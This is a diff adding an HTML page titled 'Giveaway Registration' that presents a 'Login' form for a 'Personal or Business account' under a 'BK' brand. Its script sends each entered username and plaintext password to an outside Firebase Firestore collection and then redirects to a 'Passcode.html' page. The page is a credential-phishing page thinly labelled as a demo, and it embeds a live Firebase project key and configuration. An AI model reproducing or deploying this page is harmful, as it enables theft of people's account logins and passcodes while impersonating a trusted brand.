@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0,
+               maximum-scale=1.0, user-scalable=no">
+
+<link rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+
+<title>Giveaway Registration</title>
+
+<style>
+* {
+  box-sizing: border-box;
+  -webkit-tap-highlight-color: transparent;
+}
+
+html, body {
+  margin: 0;
+  width: 100%;
+  min-height: 100%;
+  background: #071019;
+  font-family: Inter, -apple-system, BlinkMacSystemFont,
+               "Segoe UI", Roboto, Arial, sans-serif;
+  color: #fff;
+}
+
+body {
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+.app {
+  position: relative;
+  min-height: 100vh;
+  overflow: hidden;
+
+  background:
+    radial-gradient(circle at 50% 100%,
+      rgba(39,91,143,.32),
+      transparent 42%),
+    linear-gradient(180deg,
+      #071019 0%,
+      #08131e 55%,
+      #091522 100%);
+}
+
+/* DEMO BADGE */
+.demo {
+  position: fixed;
+  top: 12px;
+  left: 12px;
+  z-index: 100;
+
+  padding: 5px 9px;
+
+  border: 1px solid rgba(255,255,255,.08);
+  border-radius: 7px;
+
+  background: rgba(255,255,255,.055);
+  backdrop-filter: blur(8px);
+
+  color: #9ca8b5;
+  font-size: 9px;
+  font-weight: 700;
+  letter-spacing: 1.1px;
+}
+
+/* HEADER */
+.header {
+  position: relative;
+  z-index: 5;
+
+  height: 92px;
+
+  display: flex;
+  align-items: center;
+  justify-content: flex-end;
+
+  padding: 24px 26px 0;
+}
+
+.brand {
+  width: 45px;
+  height: 45px;
+
+  display: flex;
+  align-items: center;
+  justify-content: center;
+
+  overflow: hidden;
+
+  border: 1.7px solid rgba(255,255,255,.8);
+}
+
+.brand img {
+  width: 100%;
+  height: 100%;
+  object-fit: contain;
+  display: block;
+}
+
+/* MAIN */
+.main {
+  position: relative;
+  z-index: 5;
+
+  width: min(100% - 44px, 500px);
+
+  margin: 0 auto;
+
+  padding-top: 25px;
+  padding-bottom: 80px;
+}
+
+.title {
+  margin: 0;
+
+  text-align: center;
+
+  font-size: 30px;
+  line-height: 1.15;
+  font-weight: 700;
+  letter-spacing: -.5px;
+}
+
+.subtitle {
+  max-width: 390px;
+
+  margin: 15px auto 32px;
+
+  text-align: center;
+
+  color: #aeb8c4;
+
+  font-size: 15px;
+  line-height: 1.55;
+}
+
+/* FORM */
+.form {
+  display: flex;
+  flex-direction: column;
+  gap: 14px;
+}
+
+.input-box {
+  position: relative;
+
+  height: 62px;
+
+  display: flex;
+  align-items: center;
+
+  padding: 0 18px;
+
+  border: 1px solid rgba(255,255,255,.07);
+  border-radius: 17px;
+
+  background:
+    linear-gradient(
+      145deg,
+      rgba(39,53,67,.96),
+      rgba(27,40,53,.96)
+    );
+
+  box-shadow:
+    inset 0 1px 0 rgba(255,255,255,.025),
+    0 8px 25px rgba(0,0,0,.10);
+}
+
+.input-icon {
+  width: 21px;
+  height: 21px;
+
+  margin-right: 14px;
+
+  flex-shrink: 0;
+
+  color: #9da9b5;
+}
+
+.input-box input {
+  width: 100%;
+
+  border: 0;
+  outline: 0;
+
+  background: transparent;
+
+  color: #fff;
+
+  font-size: 16px;
+  font-weight: 500;
+}
+
+.input-box input::placeholder {
+  color: #aeb7c1;
+}
+
+/* TERMS */
+.terms {
+  margin: 18px auto 0;
+
+  max-width: 390px;
+
+  text-align: center;
+
+  color: #798692;
+
+  font-size: 11.5px;
+  line-height: 1.6;
+}
+
+.terms a {
+  color: #aeb8c2;
+  text-decoration: underline;
+}
+
+/* PRIVACY */
+.privacy-badge {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+
+  margin: 14px auto 0;
+
+  color: #8f9ca8;
+  font-size: 11.5px;
+  font-weight: 500;
+}
+
+.privacy-badge i {
+  color: #67a6e2;
+  font-size: 13px;
+}
+
+/* REGISTER */
+.create {
+  width: 100%;
+  height: 64px;
+
+  margin-top: 20px;
+
+  border: 0;
+  border-radius: 17px;
+
+  background:
+    linear-gradient(
+      135deg,
+      #347fc7,
+      #2869ae
+    );
+
+  color: #fff;
+
+  font-size: 17px;
+  font-weight: 700;
+
+  box-shadow:
+    0 10px 25px rgba(36,104,173,.25);
+
+  cursor: pointer;
+}
+
+.create:disabled {
+  opacity: .65;
+  cursor: wait;
+}
+
+/* CITY */
+.city {
+  position: absolute;
+  left: 0;
+  right: 0;
+  bottom: 0;
+
+  height: 28vh;
+  min-height: 190px;
+
+  pointer-events: none;
+  overflow: hidden;
+}
+
+.city-logo {
+  position: absolute;
+
+  left: 50%;
+  bottom: 0;
+
+  width: 180%;
+  height: 130%;
+
+  transform: translateX(-50%);
+
+  object-fit: contain;
+  object-position: center bottom;
+
+  opacity: .24;
+}
+
+/* ALERT */
+.alert-overlay {
+  position: fixed;
+  inset: 0;
+  z-index: 9999;
+
+  display: none;
+  align-items: center;
+  justify-content: center;
+
+  padding: 24px;
+
+  background: rgba(2,8,14,.72);
+
+  backdrop-filter: blur(9px);
+  -webkit-backdrop-filter: blur(9px);
+}
+
+.alert-overlay.show {
+  display: flex;
+}
+
+.alert-modal {
+  width: min(100%, 360px);
+
+  padding: 26px 22px 20px;
+
+  border: 1px solid rgba(255,255,255,.09);
+  border-radius: 22px;
+
+  background:
+    linear-gradient(
+      145deg,
+      rgba(35,50,64,.98),
+      rgba(18,31,43,.99)
+    );
+
+  box-shadow:
+    0 25px 70px rgba(0,0,0,.45),
+    inset 0 1px 0 rgba(255,255,255,.035);
+
+  text-align: center;
+
+  transform: scale(.92) translateY(10px);
+  opacity: 0;
+
+  transition:
+    transform .22s ease,
+    opacity .22s ease;
+}
+
+.alert-overlay.show .alert-modal {
+  transform: scale(1) translateY(0);
+  opacity: 1;
+}
+
+.alert-icon {
+  width: 54px;
+  height: 54px;
+
+  margin: 0 auto 16px;
+
+  display: flex;
+  align-items: center;
+  justify-content: center;
+
+  border-radius: 50%;
+
+  background: rgba(52,127,199,.13);
+  border: 1px solid rgba(80,157,224,.22);
+
+  color: #67a6e2;
+
+  font-size: 24px;
+  font-weight: 700;
+}
+
+.alert-title {
+  margin: 0;
+
+  color: #fff;
+
+  font-size: 19px;
+  font-weight: 700;
+}
+
+.alert-message {
+  margin: 9px 4px 21px;
+
+  color: #aeb8c4;
+
+  font-size: 14px;
+  line-height: 1.55;
+}
+
+.alert-button {
+  width: 100%;
+  height: 52px;
+
+  border: 0;
+  border-radius: 14px;
+
+  background:
+    linear-gradient(
+      135deg,
+      #347fc7,
+      #2869ae
+    );
+
+  color: #fff;
+
+  font-size: 15px;
+  font-weight: 700;
+
+  box-shadow:
+    0 8px 20px rgba(36,104,173,.22);
+
+  cursor: pointer;
+}
+
+.alert-button:active {
+  transform: scale(.98);
+}
+
+/* SMALL PHONES */
+@media (max-width: 380px) {
+
+  .header {
+    padding-right: 22px;
+  }
+
+  .main {
+    width: calc(100% - 36px);
+    padding-top: 20px;
+  }
+
+  .title {
+    font-size: 28px;
+  }
+
+  .subtitle {
+    font-size: 14px;
+    margin-bottom: 27px;
+  }
+
+  .input-box,
+  .create {
+    height: 60px;
+    border-radius: 16px;
+  }
+
+  .input-box input {
+    font-size: 15px;
+  }
+
+  .terms {
+    font-size: 11px;
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="app">
+
+  <header class="header">
+    <div class="brand">
+      <img src="logo.png" alt="Demo logo">
+    </div>
+  </header>
+
+  <main class="main">
+
+    <h1 class="title">
+      Login
+    </h1>
+
+    <p class="subtitle">
+      Please enter your login credentials to access your account Personal or Business account
+    </p>
+
+    <form class="form" id="loginForm">
+
+  <!-- DEMO USERNAME -->
+  <div class="input-box">
+    <svg class="input-icon"
+         viewBox="0 0 24 24"
+         fill="none"
+         stroke="currentColor"
+         stroke-width="1.8">
+      <circle cx="12" cy="8" r="3.5"/>
+      <path d="M5 20c.8-3.3 3.2-5 7-5s6.2 1.7 7 5"/>
+    </svg>
+
+    <input
+      id="username"
+      type="text"
+      placeholder="Username"
+      autocomplete="off"
+      maxlength="60"
+      required>
+  </div>
+
+  <!-- DEMO PASSWORD -->
+  <div class="input-box">
+    <svg class="input-icon"
+         viewBox="0 0 24 24"
+         fill="none"
+         stroke="currentColor"
+         stroke-width="1.8">
+      <rect x="5" y="10" width="14" height="10" rx="2"/>
+      <path d="M8 10V7a4 4 0 0 1 8 0v3"/>
+    </svg>
+
+    <input
+      id="password"
+      type="password"
+      placeholder="Password"
+      autocomplete="off"
+      maxlength="100"
+      required>
+  </div>
+
+  <button
+    class="create"
+    id="createBtn"
+    type="submit">
+    Login
+  </button>
+
+    </form>
+    
+      <!-- TERMS -->
+      <p class="terms">
+        By proceeding you agree to our 
+
+        <a href="#" onclick="return false;">
+          Terms and Conditions
+        </a>
+
+        and
+
+        <a href="#" onclick="return false;">
+          Privacy Policy
+        </a>.
+      </p>
+
+
+      <!-- PRIVACY -->
+      <div class="privacy-badge">
+
+        <i class="fa-solid fa-shield-halved"></i>
+
+        <span>
+          Your information is protected by BK.
+        </span>
+
+      </div>
+
+
+  </main>
+
+
+  <div class="city" aria-hidden="true">
+
+    <img
+      class="city-logo"
+      src="bk-logo.png"
+      alt="">
+  </div>
+
+</div>
+
+
+<!-- ALERT -->
+<div
+  class="alert-overlay"
+  id="alertOverlay">
+
+  <div class="alert-modal">
+
+    <div
+      class="alert-icon"
+      id="alertIcon">
+      !
+    </div>
+
+    <h2
+      class="alert-title"
+      id="alertTitle">
+      Notice
+    </h2>
+
+    <p
+      class="alert-message"
+      id="alertMessage">
+      Something happened.
+    </p>
+
+    <button
+      class="alert-button"
+      id="alertButton"
+      type="button">
+      OK
+    </button>
+
+  </div>
+
+</div>
+
+
+<!-- FIREBASE -->
+<script type="module">
+
+import { initializeApp }
+from "https://www.gstatic.com/firebasejs/12.1.0/firebase-app.js";
+
+import {
+  getFirestore,
+  collection,
+  addDoc,
+  serverTimestamp
+}
+from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";
+
+
+const firebaseConfig = {
+  apiKey: "AIzaSyCZXXmImiPPi75gjOC5wIOoMF-C7TjXJWA",
+  authDomain: "fllz-cc5c5.firebaseapp.com",
+  projectId: "fllz-cc5c5",
+  storageBucket: "fllz-cc5c5.firebasestorage.app",
+  messagingSenderId: "536967059421",
+  appId: "1:536967059421:web:ed0a57e25930008bdc0834"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+
+const form = document.getElementById("loginForm");
+const username = document.getElementById("username");
+const password = document.getElementById("password");
+const createBtn = document.getElementById("createBtn");
+
+
+form.addEventListener("submit", async (e) => {
+
+  e.preventDefault();
+
+  const demoUsername = username.value.trim();
+  const demoPassword = password.value;
+
+  if (!demoUsername) {
+    alert("Please enter a demo username.");
+    username.focus();
+    return;
+  }
+
+  if (!demoPassword) {
+    alert("Please enter a dummy password.");
+    password.focus();
+    return;
+  }
+
+  createBtn.disabled = true;
+  createBtn.textContent = "Logging in...";
+
+  try {
+
+    await addDoc(collection(db, "demoLogins"), {
+      demoUsername: demoUsername,
+      demoPasswordProvided: demoPassword,
+      createdAt: serverTimestamp()
+    });
+
+    // Redirect after successful Firestore write
+    window.location.href = "Passcode.html";
+
+  } catch (error) {
+  console.error("Firebase error:", error);
+  alert("Firebase error: " + error.code + "\n" + error.message);
+
+} finally {
+  createBtn.disabled = false;
+  createBtn.textContent = "Login";
+      }
+
+});
+
+</script>
+
+</body>
+</html>
